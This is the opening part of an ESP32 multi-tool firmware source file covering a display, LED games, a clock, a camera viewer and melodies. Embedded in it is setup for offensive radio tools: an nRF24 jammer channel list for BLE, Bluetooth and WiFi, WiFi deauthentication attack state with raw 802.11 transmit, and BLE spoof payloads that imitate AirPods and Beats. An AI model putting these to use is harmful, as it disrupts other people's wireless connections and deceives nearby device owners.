#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>

#if __has_include(<RF24.h>)
#include <RF24.h>
#define HAS_RF24_LIB 1
#else
#define HAS_RF24_LIB 0
#endif

#include <WiFi.h>
#include <WebServer.h>
#include <WiFiManager.h>
#include <time.h>

#include <LittleFS.h>
#include <AnimatedGIF.h>

#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>

#include <FastLED.h>
#include <esp_wifi.h>
#include <esp_bt.h>

#include <TJpg_Decoder.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEServer.h>
#include <BLEAdvertisedDevice.h>

// =========================================================
// Pins
// =========================================================
#define TFT_CS    -1
#define TFT_DC     34
#define TFT_RST    35
#define TFT_MOSI   36
#define TFT_SCLK   37
#define TFT_BLK    33

#define RGB_CONTROL_PIN 14
#define RGB_COUNT       64

#define QMI8658_ADDR 0x6B
#define I2C_SDA 11
#define I2C_SCL 12

#define BTN_UP_PIN    38
#define BTN_DOWN_PIN  39
#define BTN_OK_PIN    40

#define BUZZER_PIN 1

// =========================================================
// RF24 Jammer Globals
// =========================================================
#define NRF_CE_PIN  15
#define NRF_CSN_PIN 16
#if HAS_RF24_LIB
RF24 nrfRadio(NRF_CE_PIN, NRF_CSN_PIN);
#endif
bool nrfRadioFound = false;
bool nrfJammingActive = false;
uint8_t nrfJamMode = 0; // 0=BLE, 1=Bluetooth, 2=WiFi
const byte nrfJamBle[] = {2, 26, 80};
const byte nrfJamBt[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte nrfJamWifi[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
unsigned long lastNrfJamHopMs = 0;

// =========================================================
// Filesystem paths
// =========================================================
static const char *TFT_BL_PATH = "/tft_bl.txt";
static const char *BRIGHTNESS_PATH = "/brightness.txt";
static const char *IMU_ON_PATH = "/imu_on.txt";
static const char *UI_SFX_PATH = "/ui_sfx.txt";
static const char *SLEEP_MODE_PATH = "/sleep_mode.txt";
static const char *CLOCK_VIEW_PATH = "/clock_view.txt";
static const char *BUZZER_VOL_PATH = "/buzzer_vol.txt";
static const char *WIFI_SSID_PATH = "/wifi_ssid.txt";
static const char *WIFI_PASS_PATH = "/wifi_pass.txt";
static const char *UTC_OFFSET_PATH = "/utc_off_min.txt";
static const char *BMP_PATH = "/img.bmp";
static const char *GIF_PATH = "/img.gif";
static const char *MATRIX_PATH = "/matrix_rgb.bin";
static const char *CAM_URL_PATH = "/cam_url.txt";

// =========================================================
// Limits / colors
// =========================================================
static const size_t MAX_UPLOAD_BYTES = 300 * 1024;

static const uint16_t UI_BG = 0x0841;
static const uint16_t UI_CARD = 0x10A2;
static const uint16_t UI_CARD_SEL = 0x14B9;
static const uint16_t UI_LINE = 0x4208;
static const uint16_t UI_TEXT = 0xFFFF;
static const uint16_t UI_MUTED = 0xBDF7;
static const uint16_t UI_ACCENT = 0x2DFD;
static const uint16_t UI_WARN = 0xFD20;
static const uint16_t UI_OK = 0x87F0;

// =========================================================
// Time / NTP
// =========================================================
static int32_t gUtcOffsetMinutes = 7 * 60;
static bool timeSynced = false;
static uint32_t lastTimeSyncAttemptMs = 0;

static const int16_t kUtcOffsetsMin[] = {
  -12 * 60, -11 * 60, -10 * 60, -9 * 60 - 30, -9 * 60, -8 * 60, -7 * 60,
  -6 * 60, -5 * 60, -4 * 60, -3 * 60 - 30, -3 * 60, -2 * 60, -1 * 60, 0,
  1 * 60, 2 * 60, 3 * 60, 3 * 60 + 30, 4 * 60, 4 * 60 + 30, 5 * 60,
  5 * 60 + 30, 5 * 60 + 45, 6 * 60, 6 * 60 + 30, 7 * 60, 8 * 60,
  8 * 60 + 45, 9 * 60, 9 * 60 + 30, 10 * 60, 10 * 60 + 30, 11 * 60,
  12 * 60, 12 * 60 + 45, 13 * 60, 14 * 60
};
static const int kUtcOffsetsCount = sizeof(kUtcOffsetsMin) / sizeof(kUtcOffsetsMin[0]);

// =========================================================
// TFT / Matrix / IMU state
// =========================================================
Adafruit_ST7789 tft(TFT_CS, TFT_DC, TFT_RST);
static CRGB leds[RGB_COUNT];
static CRGB Matrix_Color[8][8];
static CRGB matrixTextColor = CRGB::White;

// Pseudo GFX untuk drawing langsung ke Matrix_Color
class Matrix8x8GFX : public Adafruit_GFX {
public:
  Matrix8x8GFX() : Adafruit_GFX(8, 8) {}
  void drawPixel(int16_t x, int16_t y, uint16_t color) override {
    if (x >= 0 && x < 8 && y >= 0 && y < 8) {
      if (color) Matrix_Color[y][x] = matrixTextColor;
    }
  }
};
static Matrix8x8GFX matrixGfx;


struct IMUdata {
  float x;
  float y;
  float z;
};

static IMUdata Accel = {0, 0, 1};
static IMUdata Gyro = {0, 0, 0};

static uint8_t gTftBacklight = 255;
static uint8_t gTftBacklightBeforeSleep = 255;
static uint8_t gBrightness = 60;
static uint8_t RGB_Data[3] = {0, 0, 80};
static bool blDirty = true;
static bool brightnessDirty = true;
static bool imuOn = true;
static bool tftSleeping = false;
static bool matrixSleeping = false;
static bool matrixDirty = true;
static bool deferredInitDone = false;
static uint32_t deferredInitAtMs = 0;

// =========================================================
// App mode
// =========================================================
enum AppMode : uint8_t {
  APP_UI = 0,
  APP_VIEW_BMP,
  APP_VIEW_GIF,
  APP_GAME,
  APP_CAMERA,
  APP_MATRIX_TEXT
};

static AppMode appMode = APP_UI;
static bool tftDirty = true;
static bool uiDirty = true;
static bool matrixIdleDirty = true;
static uint32_t mediaStamp = 0;
static uint32_t lastMediaStamp = 0;

// BMP viewer path override
static String bmpViewPath = BMP_PATH;

// Camera / MJPEG
static String cameraUrl = "http://192.168.25.66:4747/video";
static String cameraBoundary = "";
static String cameraLastError = "";
static String cameraCapturePath = "";
static WiFiClient cameraClient;
static bool cameraStreamReady = false;
static bool cameraCapturePending = false;
static bool cameraCaptureActive = false;
static uint32_t cameraLastConnectMs = 0;
static uint32_t cameraLastFrameMs = 0;
static uint8_t cameraFailCount = 0;
static uint16_t cameraFrameW = 0;
static uint16_t cameraFrameH = 0;
static int16_t cameraFrameX = 0;
static int16_t cameraFrameY = 0;
static File cameraBmpFile;
static uint16_t cameraCaptureNextRow = 0;
static const uint32_t CAMERA_RECONNECT_MS = 2000;
static const size_t CAMERA_MAX_JPEG = 120 * 1024;
// Frame skipping / throttling to reduce CPU/TFT load (ms)
static uint32_t cameraLastDisplayMs = 0;
static const uint16_t CAMERA_MIN_FRAME_MS = 50; // ~20 FPS target
static uint32_t cameraReconnectBackoffUntilMs = 0;
static float cameraDisplayScale = 1.0f;
static int16_t cameraDisplayW = 0;
static int16_t cameraDisplayH = 0;
static int16_t cameraDisplayX = 0;
static int16_t cameraDisplayY = 0;
static bool cameraSkipTftDuringCapture = false;
static uint32_t cameraCaptureIndicatorUntilMs = 0;
static uint8_t prevTftRotation = 0;
static bool cameraRotationSaved = false;
// `prevUiScreenBeforeView` declared after `UiScreen` enum below.

// =========================================================
// Buttons
// =========================================================
struct BtnState {
  uint8_t pin;
  bool stable;
  bool lastStable;
  uint32_t lastChangeMs;
  bool pressEvent;
  bool releaseEvent;
  uint32_t pressStartMs;
  bool longFired;
};

static BtnState btnUp = {BTN_UP_PIN, false, false, 0, false, false, 0, false};
static BtnState btnDown = {BTN_DOWN_PIN, false, false, 0, false, false, 0, false};
static BtnState btnOk = {BTN_OK_PIN, false, false, 0, false, false, 0, false};

static const uint32_t DEBOUNCE_MS = 25;
static const uint32_t LONGPRESS_MS = 700;

// =========================================================
// UI screens / icons
// =========================================================
enum UiScreen : uint8_t {
  UI_MENU = 0,
  UI_MEDIA_MENU,
  UI_SETTINGS_MENU,
  UI_SONG_MENU,
  UI_TOOLS_MENU,
  UI_WIFI_LIST,
  UI_WIFI_KEYBOARD,
  UI_TOOL_CALC,
  UI_TOOL_STOPWATCH,
  UI_TOOL_TIMER,
  UI_TOOL_LAMP,
  UI_SET_TFT_BL,
  UI_SET_MATRIX_BR,
  UI_SET_UTC_OFFSET,
  UI_DEAUTH_SCANNER,
  UI_DEAUTH_REASON_PICKER,
  UI_DEAUTH_ATTACK,
  UI_FILE_EXPLORER,
  UI_FILE_ACTION,
  UI_FILE_VIEWER,
  UI_MATRIX_TEXT_MENU,
  UI_MATRIX_TEXT_KEYBOARD,
  UI_NOTE_EDITOR_MENU,
  UI_NOTE_EDITOR_MAIN,
  UI_BLE_SPOOFER,
  UI_BLE_SCANNER,
  UI_RF_JAMMER,
};

enum UiIcon : uint8_t {
  ICON_GAME = 0,
  ICON_MEDIA,
  ICON_SETTINGS,
  ICON_TOOLS,
  ICON_SLEEP,
  ICON_SONG,
  UI_ICON_COUNT
};

enum MediaMenuItem : uint8_t {
  MEDIA_ITEM_BMP = 0,
  MEDIA_ITEM_GIF,
  MEDIA_ITEM_CAMERA,
  MEDIA_ITEM_COUNT
};

enum SettingsMenuItem : uint8_t {
  SETTING_ITEM_TFT_BL = 0,
  SETTING_ITEM_LED_BR,
  SETTING_ITEM_UTC,
  SETTING_ITEM_WIFI,
  SETTING_ITEM_IMU,
  SETTING_ITEM_UI_SFX,
  SETTING_ITEM_SLEEP_MODE,
  SETTING_ITEM_CLOCK_VIEW,
  SETTING_ITEM_CAM_URL,
  SETTING_ITEM_BUZZER_VOL,
  SETTING_ITEM_COUNT
};

enum SleepMode : uint8_t {
  SLEEP_BOTH = 0,
  SLEEP_SCREEN_ONLY,
  SLEEP_LED_ONLY,
  SLEEP_STANDBY_SCREEN,
  SLEEP_BMP_CLOCK,
  SLEEP_GIF_CLOCK
};

enum ClockDisplayMode : uint8_t {
  CLOCK_VIEW_TIME = 0,
  CLOCK_VIEW_TIME_DATE,
  CLOCK_VIEW_DATE
};

enum SongMenuItem : uint8_t {
  SONG_ITEM_MERRY = 0,
  SONG_ITEM_PIRATES,
  SONG_ITEM_PINK,
  SONG_ITEM_CLASSIC,
  SONG_ITEM_NOTE_FILE,
  SONG_ITEM_STOP,
  SONG_ITEM_COUNT
};

enum ToolsMenuItem : uint8_t {
  TOOLS_ITEM_CALC = 0,
  TOOLS_ITEM_STOPWATCH,
  TOOLS_ITEM_TIMER,
  TOOLS_ITEM_LAMP,
  TOOLS_ITEM_DEAUTH,
  TOOLS_ITEM_TEXT_LED,
  TOOLS_ITEM_NOTE_EDITOR,
  TOOLS_ITEM_FILE,
  TOOLS_ITEM_BLE_SPOOF,
  TOOLS_ITEM_BLE_SCAN,
  TOOLS_ITEM_RF_JAMMER,
  TOOLS_ITEM_COUNT,
};

static UiScreen uiScreen = UI_MENU;
static UiScreen prevUiScreenBeforeView = UI_MENU;
static int uiIndex = 0;
static int uiEditValue = 0;
static int uiOffsetIdx = 0;
static uint8_t mediaMenuIndex = 0;
static uint8_t settingsMenuIndex = 0;
static uint8_t songMenuIndex = 0;
static uint8_t toolsMenuIndex = 0;
static uint8_t wifiListIndex = 0;
static int lastUiMinute = -1;
static int lastSleepMinute = -1;
static bool uiSfxEnabled = true;
static uint8_t buzzerVolume = 10;
static SleepMode sleepMode = SLEEP_BOTH;
static ClockDisplayMode clockDisplayMode = CLOCK_VIEW_TIME;
static bool sleepScreenDimmed = false;
static uint32_t calcRepeatUpMs = 0;
static uint32_t calcRepeatDownMs = 0;

struct CalcState {
  int16_t left;
  int16_t right;
  uint8_t op;
  uint8_t field;
};

struct StopwatchState {
  bool running;
  uint32_t accumulatedMs;
  uint32_t startedMs;
};

struct TimerState {
  bool running;
  bool finished;
  uint16_t setSeconds;
  uint16_t remainingSeconds;
  uint32_t lastTickMs;
};

static CalcState calcState = {12, 3, 0, 0};
static StopwatchState stopwatchState = {false, 0, 0};
static TimerState timerState = {false, false, 60, 60, 0};

// File Explorer
#define EXPLORER_MAX_FILES 32
static String explorerFileNames[EXPLORER_MAX_FILES];
static uint32_t explorerFileSizes[EXPLORER_MAX_FILES];
static uint8_t explorerFileCount = 0;
static uint8_t explorerListIndex = 0;
static uint8_t explorerRootCount = 0;

// File Viewer
static String fileViewerLines[64];
static uint8_t fileViewerLineCount = 0;
static uint8_t fileViewerScrollLines = 0;

// Matrix Text
static String matrixTextSaved = "HELLO";
static bool matrixTextScroll = true;
static int matrixTextX = 8;
static uint32_t matrixTextLastMs = 0;
static uint8_t matrixTextMenuIndex = 0;
static uint8_t matrixTextColorIdx = 0;

enum WifiKeyboardMode : uint8_t { WIFI_KEYS_ALPHA = 0, WIFI_KEYS_NUMBER, WIFI_KEYS_SYMBOL };

enum TextKeyboardTarget : uint8_t {
  TEXT_TARGET_MATRIX = 0,
  TEXT_TARGET_NOTE_SAVE,
  TEXT_TARGET_NOTE_LOAD,
  TEXT_TARGET_SONG_NOTE
  ,TEXT_TARGET_CAMERA_URL
};

// Keyboard Text global
static String textKeyboardBuffer = "";
static WifiKeyboardMode textKeyboardMode = WIFI_KEYS_ALPHA;
static bool textKeyboardShift = false;
static uint8_t textKeyboardRow = 0, textKeyboardCol = 0;
static bool textKeyboardUpLatched = false, textKeyboardDownLatched = false;
static TextKeyboardTarget textKeyboardTarget = TEXT_TARGET_MATRIX;

// Note editor
struct NoteStep {
  uint16_t freq;
  uint16_t durMs;
};
static const uint8_t NOTE_MAX_STEPS = 64;
static NoteStep noteSteps[NOTE_MAX_STEPS];
static uint8_t noteStepCount = 0;
static uint8_t noteCursor = 0;
static uint8_t notePitchIndex = 0;
static uint8_t noteDurIndex = 2;
static uint8_t noteEditorMenuIndex = 0;
static bool notePlaying = false;
static uint8_t notePlayIndex = 0;
static uint32_t noteStepUntilMs = 0;
static String noteLoadedName = "default";

static bool lampOn = false;
static uint8_t lampBrightnessBefore = 60;
static bool lampIdleDirtyBefore = false;
static CRGB lampSceneBackup[8][8];
static bool lampSceneSaved = false;
static const uint8_t LAMP_SAFE_BRIGHTNESS = 72;
static const uint8_t WIFI_SCAN_MAX = 8;
static String wifiScanSsids[WIFI_SCAN_MAX];
static int32_t wifiScanRssi[WIFI_SCAN_MAX];
static bool wifiScanOpen[WIFI_SCAN_MAX];
static uint8_t deauthScanBssids[WIFI_SCAN_MAX][6];
static uint8_t deauthScanChannels[WIFI_SCAN_MAX];
static uint8_t wifiScanCount = 0;
static String wifiSelectedSsid = "";
static bool wifiSelectedOpen = false;
static String wifiPasswordBuffer = "";
static WifiKeyboardMode wifiKeyboardMode = WIFI_KEYS_ALPHA;
static bool wifiKeyboardShift = false;
static uint8_t wifiKeyboardRow = 0;
static uint8_t wifiKeyboardCol = 0;
static bool wifiKeyboardUpLongLatched = false;
static bool wifiKeyboardDownLongLatched = false;
static String wifiStatusMessage = "";
static bool wifiLastConnectOk = false;

// ============================================
// deauth func
// ============================================

// Deklarasi fungsi SDK ESP32 yang diperlukan
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type); // proto

static uint8_t deauthTargetBssid[6];
static int deauthTargetChannel = 1;
static String deauthTargetSsid = "";
static uint16_t reasonListIndex = 1;

struct DeauthReasonDef {
  uint16_t code;
  const char* title;
};

static const DeauthReasonDef deauthReasonList[] = {
  {0,"0:Rsv"},{1,"1:Unspec"},{2,"2:AuthInv"},{3,"3:Leave"},{4,"4:Inact"},
  {5,"5:Overload"},{6,"6:Cls2"},{7,"7:Cls3"},{8,"8:LeaveBSS"},{9,"9:NoAuth"},
  {10,"10:PwrCap"},{11,"11:SupCh"},{12,"12:BSSTr"},{13,"13:InvElem"},{14,"14:MIC"},
  {15,"15:4WayTO"},{16,"16:GrpTO"},{17,"17:4WayMM"},{18,"18:InvGrp"},{19,"19:InvPW"},
  {20,"20:InvAK"},{21,"21:RSNEv"},{22,"22:RSNEc"},{23,"23:802.1X"},{24,"24:Cipher"}
};
static const uint8_t deauthReasonCount = 25;

static uint16_t selectedReason = 1;

static bool deauthKilling = false;
static uint32_t lastDeauthSentMs = 0;
static uint32_t deauthPacketsSent = 0;

// =========================================================
// Matrix templates
// =========================================================
enum MatrixTemplate : uint8_t {
  MT_CLEAR = 0,
  MT_SMILEY,
  MT_NEUTRAL,
  MT_LEFT,
  MT_RIGHT,
  MT_CONCERN,
  MT_SLEEPY
};

// =========================================================
// Game state
// =========================================================
static const uint8_t PLAYER_Y = 7;
static const uint8_t MAX_ENEMIES = 7;
static const uint8_t MAX_PLAYER_BULLETS = 4;
static const uint8_t MAX_ENEMY_BULLETS = 4;

struct Bullet {
  bool active;
  int8_t x;
  int8_t y;
};

struct Enemy {
  bool active;
  int8_t x;
  int8_t y;
  uint8_t hp;
  int8_t drift;
};

struct GameState {
  bool active;
  bool over;
  uint8_t shipX;
  uint8_t hp;
  uint16_t score;
  uint16_t kills;
  uint16_t level;
  uint32_t lastShipMoveMs;
  uint32_t lastFireMs;
  uint32_t lastBulletStepMs;
  uint32_t lastEnemyBulletStepMs;
  uint32_t lastEnemyStepMs;
  uint32_t lastEnemySpawnMs;
  uint32_t lastEnemyFireMs;
  uint32_t lastHudMs;
};

static GameState game = {false, false, 3, 3, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0};
static Bullet playerBullets[MAX_PLAYER_BULLETS];
static Bullet enemyBullets[MAX_ENEMY_BULLETS];
static Enemy enemies[MAX_ENEMIES];

enum GameView : uint8_t {
  GAME_VIEW_MENU = 0,
  GAME_VIEW_SHOOTER,
  GAME_VIEW_TETRIS,
  GAME_VIEW_WATER,
  GAME_VIEW_PONG
};

enum GameMenuItem : uint8_t {
  GAME_ITEM_SHOOTER = 0,
  GAME_ITEM_TETRIS,
  GAME_ITEM_WATER,
  GAME_ITEM_PONG,
  GAME_ITEM_COUNT
};

static GameView gameView = GAME_VIEW_MENU;
static uint8_t gameMenuIndex = 0;
static CRGB matrixSceneBackup[8][8];
static bool matrixSceneBackupValid = false;

struct TetrisState {
  bool active;
  bool over;
  uint8_t board[8][8];
  uint8_t pieceType;
  uint8_t rotation;
  int8_t x;
  int8_t y;
  uint16_t score;
  uint16_t lines;
  uint8_t level;
  uint32_t lastFallMs;
  uint32_t lastMoveMs;
  uint32_t lastHudMs;
};

static TetrisState tetris = {false, false, {{0}}, 0, 0, 2, 0, 0, 0, 1, 0, 0, 0};

// Pong state
struct PongState {
  bool active;
  bool over;
  float ballX, ballY;
  float ballVX, ballVY;
  float playerX;
  float aiX;
  uint8_t playerScore;
  uint8_t aiScore;
  uint8_t maxScore;
  uint32_t lastFrameMs;
  uint32_t lastHudMs;
};
static PongState pong = {false, false, 120, 120, 2.0f, -2.0f, 100, 100, 0, 0, 5, 0, 0};

static const CRGB tetrisColors[8] = {
  CRGB::Black,
  CRGB(0, 220, 255),
  CRGB(255, 220, 0),
  CRGB(170, 80, 255),
  CRGB(0, 255, 110),
  CRGB(255, 70, 70),
  CRGB(70, 130, 255),
  CRGB(255, 140, 0)
};

static const int8_t tetrisShapeXY[7][4][4][2] = {
  {{{0,1},{1,1},{2,1},{3,1}}, {{2,0},{2,1},{2,2},{2,3}}, {{0,2},{1,2},{2,2},{3,2}}, {{1,0},{1,1},{1,2},{1,3}}},
  {{{1,0},{2,0},{1,1},{2,1}}, {{1,0},{2,0},{1,1},{2,1}}, {{1,0},{2,0},{1,1},{2,1}}, {{1,0},{2,0},{1,1},{2,1}}},
  {{{1,0},{0,1},{1,1},{2,1}}, {{1,0},{1,1},{2,1},{1,2}}, {{0,1},{1,1},{2,1},{1,2}}, {{1,0},{0,1},{1,1},{1,2}}},
  {{{1,0},{2,0},{0,1},{1,1}}, {{1,0},{1,1},{2,1},{2,2}}, {{1,1},{2,1},{0,2},{1,2}}, {{0,0},{0,1},{1,1},{1,2}}},
  {{{0,0},{1,0},{1,1},{2,1}}, {{2,0},{1,1},{2,1},{1,2}}, {{0,1},{1,1},{1,2},{2,2}}, {{1,0},{0,1},{1,1},{0,2}}},
  {{{0,0},{0,1},{1,1},{2,1}}, {{1,0},{2,0},{1,1},{1,2}}, {{0,1},{1,1},{2,1},{2,2}}, {{1,0},{1,1},{0,2},{1,2}}},
  {{{2,0},{0,1},{1,1},{2,1}}, {{1,0},{1,1},{1,2},{2,2}}, {{0,1},{1,1},{2,1},{0,2}}, {{0,0},{1,0},{1,1},{1,2}}}
};

// ============================================
// BLE Tools Globals (Spoofer, Monitor)
// ============================================
static BLEScan* pBLEScan = nullptr;
static BLEAdvertising *pBleAdvertising = nullptr;
static BLEServer *pBleServer = nullptr;
static bool bleInitialized = false;
static bool bleSessionActive = false;

// Spoofer
static bool bleSpoofingActive = false;
static uint8_t bleSpoofIndex = 0;
static const char* bleSpoofNames[] = {
  "AirPods", "AirPods Pro", "AirPods Max", "AirPods Gen 2", 
  "AirPods Gen 3", "PowerBeats", "Beats Solo 3", "Beats Fit Pro"
};
static const uint8_t bleSpoofCount = 8;
static const uint8_t bleSpoofPayloads[8][31] = {
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00}
};

// Monitor Tracking
static const uint8_t BLE_MAX_DEVICES = 16;
struct BleDevInfo {
  String mac;
  String name;
  int rssi;
  uint16_t packetCount;
};
static BleDevInfo bleDevices[BLE_MAX_DEVICES];
static uint8_t bleDevCount = 0;
static uint8_t bleListIndex = 0;
static String bleStatusMessage = "";

// =========================================================
// Song
// =========================================================
#define NOTE_B0  31
#define NOTE_C1  33
#define NOTE_CS1 35
#define NOTE_D1  37
#define NOTE_DS1 39
#define NOTE_E1  41
#define NOTE_F1  44
#define NOTE_FS1 46
#define NOTE_G1  49
#define NOTE_GS1 52
#define NOTE_A1  55
#define NOTE_AS1 58
#define NOTE_B1  62
#define NOTE_C2  65
#define NOTE_CS2 69
#define NOTE_D2  73
#define NOTE_DS2 78
#define NOTE_E2  82
#define NOTE_F2  87
#define NOTE_FS2 93
#define NOTE_G2  98
#define NOTE_GS2 104
#define NOTE_A2  110
#define NOTE_AS2 117
#define NOTE_B2  123
#define NOTE_C3  131
#define NOTE_CS3 139
#define NOTE_D3  147
#define NOTE_DS3 156
#define NOTE_E3  165
#define NOTE_F3  175
#define NOTE_FS3 185
#define NOTE_G3  196
#define NOTE_GS3 208
#define NOTE_A3  220
#define NOTE_AS3 233
#define NOTE_B3  247
#define NOTE_C4  262
#define NOTE_CS4 277
#define NOTE_D4  294
#define NOTE_DS4 311
#define NOTE_E4  330
#define NOTE_F4  349
#define NOTE_FS4 370
#define NOTE_G4  392
#define NOTE_GS4 415
#define NOTE_A4  440
#define NOTE_AS4 466
#define NOTE_B4  494
#define NOTE_C5  523
#define NOTE_CS5 554
#define NOTE_D5  587
#define NOTE_DS5 622
#define NOTE_E5  659
#define NOTE_F5  698
#define NOTE_FS5 740
#define NOTE_G5  784
#define NOTE_GS5 831
#define NOTE_A5  880
#define NOTE_AS5 932
#define NOTE_B5  988
#define NOTE_C6  1047
#define NOTE_CS6 1109
#define NOTE_D6  1175
#define NOTE_DS6 1245
#define NOTE_E6  1319
#define NOTE_F6  1397
#define NOTE_FS6 1480
#define NOTE_G6  1568
#define NOTE_GS6 1661
#define NOTE_A6  1760
#define NOTE_AS6 1865
#define NOTE_B6  1976
#define NOTE_C7  2093
#define NOTE_CS7 2217
#define NOTE_D7  2349
#define NOTE_DS7 2489
#define NOTE_E7  2637
#define NOTE_F7  2794
#define NOTE_FS7 2960
#define NOTE_G7  3136
#define NOTE_GS7 3322
#define NOTE_A7  3520
#define NOTE_AS7 3729
#define NOTE_B7  3951
#define NOTE_C8  4186
#define NOTE_CS8 4435
#define NOTE_D8  4699
#define NOTE_DS8 4978
#define REST      0

enum SongType : uint8_t {
  SONG_TYPE_MELODY = 0,
  SONG_TYPE_TEXT
};

enum SongId : uint8_t {
  SONG_ID_MERRY = 0,
  SONG_ID_PIRATES,
  SONG_ID_PINK,
  SONG_ID_CLASSIC,
  SONG_ID_COUNT,
  SONG_ID_NONE = 255
};

static const int tempoPinkPanther = 120;
static const int16_t melodyPinkPanther[] PROGMEM = {
  REST,2, REST,4, REST,8, NOTE_DS4,8,
  NOTE_E4,-4, REST,8, NOTE_FS4,8, NOTE_G4,-4, REST,8, NOTE_DS4,8,
  NOTE_E4,-8, NOTE_FS4,8, NOTE_G4,-8, NOTE_C5,8, NOTE_B4,-8, NOTE_E4,8, NOTE_G4,-8, NOTE_B4,8,
  NOTE_AS4,2, NOTE_A4,-16, NOTE_G4,-16, NOTE_E4,-16, NOTE_D4,-16,
  NOTE_E4,2, REST,4, REST,8, NOTE_DS4,4,
  NOTE_E4,-4, REST,8, NOTE_FS4,8, NOTE_G4,-4, REST,8, NOTE_DS4,8,
  NOTE_E4,-8, NOTE_FS4,8, NOTE_G4,-8, NOTE_C5,8, NOTE_B4,-8, NOTE_G4,8, NOTE_B4,-8, NOTE_E5,8,
  NOTE_DS5,1,
  NOTE_D5,2, REST,4, REST,8, NOTE_DS4,8,
  NOTE_E4,-4, REST,8, NOTE_FS4,8, NOTE_G4,-4, REST,8, NOTE_DS4,8,
  NOTE_E4,-8, NOTE_FS4,8, NOTE_G4,-8, NOTE_C5,8, NOTE_B4,-8, NOTE_E4,8, NOTE_G4,-8, NOTE_B4,8,
  NOTE_AS4,2, NOTE_A4,-16, NOTE_G4,-16, NOTE_E4,-16, NOTE_D4,-16,
  NOTE_E4,-4, REST,4,
  REST,4, NOTE_E5,-8, NOTE_D5,8, NOTE_B4,-8, NOTE_A4,8, NOTE_G4,-8, NOTE_E4,-8,
  NOTE_AS4,16, NOTE_A4,-8, NOTE_AS4,16, NOTE_A4,-8, NOTE_AS4,16, NOTE_A4,-8, NOTE_AS4,16, NOTE_A4,-8,
  NOTE_G4,-16, NOTE_E4,-16, NOTE_D4,-16, NOTE_E4,16, NOTE_E4,16, NOTE_E4,2,
};

static const int tempoMerry = 140;
static const int16_t melodyMerry[] PROGMEM = {
  NOTE_C5,4, NOTE_G5,4, NOTE_G5,8, NOTE_G5,8, NOTE_G5,8, NOTE_E5,8,
  NOTE_D5,4, NOTE_D5,4, NOTE_D5,4,
  NOTE_G5,4, NOTE_G5,8, NOTE_A5,8, NOTE_G5,8, NOTE_G5,8,
  NOTE_E5,4, NOTE_C5,4, NOTE_C5,4,
  NOTE_A5,4, NOTE_A5,8, NOTE_AS5,8, NOTE_A5,8, NOTE_G5,8,
  NOTE_G5,4, NOTE_D5,4, NOTE_C5,8, NOTE_C5,8,
  NOTE_D5,4, NOTE_G5,4, NOTE_E5,4,
  NOTE_G5,2, NOTE_C5,4,
  NOTE_G5,4, NOTE_G5,8, NOTE_G5,8, NOTE_G5,8, NOTE_E5,8,
  NOTE_D5,4, NOTE_D5,4, NOTE_D5,4,
  NOTE_G5,4, NOTE_G5,8, NOTE_A5,8, NOTE_G5,8, NOTE_G5,8,
  NOTE_E5,4, NOTE_C5,4, NOTE_C5,4,
  NOTE_A5,4, NOTE_A5,8, NOTE_AS5,8, NOTE_A5,8, NOTE_G5,8,
  NOTE_G5,4, NOTE_D5,4, NOTE_C5,8, NOTE_C5,8,
  NOTE_D5,4, NOTE_G5,4, NOTE_E5,4,
  NOTE_G5,2, NOTE_C5,4,
  NOTE_G5,4, NOTE_G5,4, NOTE_G5,4,
  NOTE_E5,2, NOTE_E5,4,
  NOTE_G5,4, NOTE_E5,4, NOTE_D5,4,
  NOTE_C5,2, NOTE_A5,4,
  NOTE_AS5,4, NOTE_A5,4, NOTE_G5,4,
  NOTE_C6,4, NOTE_C5,4, NOTE_C5,8, NOTE_C5,8,
  NOTE_D5,4, NOTE_G5,4, NOTE_E5,4,
  NOTE_G5,2, NOTE_C5,4,
  NOTE_G5,4, NOTE_G5,8, NOTE_G5,8, NOTE_G5,8, NOTE_E5,8,
  NOTE_D5,4, NOTE_D5,4, NOTE_D5,4,
  NOTE_G5,4, NOTE_G5,8, NOTE_A5,8, NOTE_G5,8, NOTE_G5,8,
  NOTE_E5,4, NOTE_C5,4, NOTE_C5,4,
  NOTE_A5,4, NOTE_A5,8, NOTE_AS5,8, NOTE_A5,8, NOTE_G5,8,
  NOTE_G5,4, NOTE_D5,4, NOTE_C5,8, NOTE_C5,8,
  NOTE_D5,4, NOTE_G5,4, NOTE_E5,4,
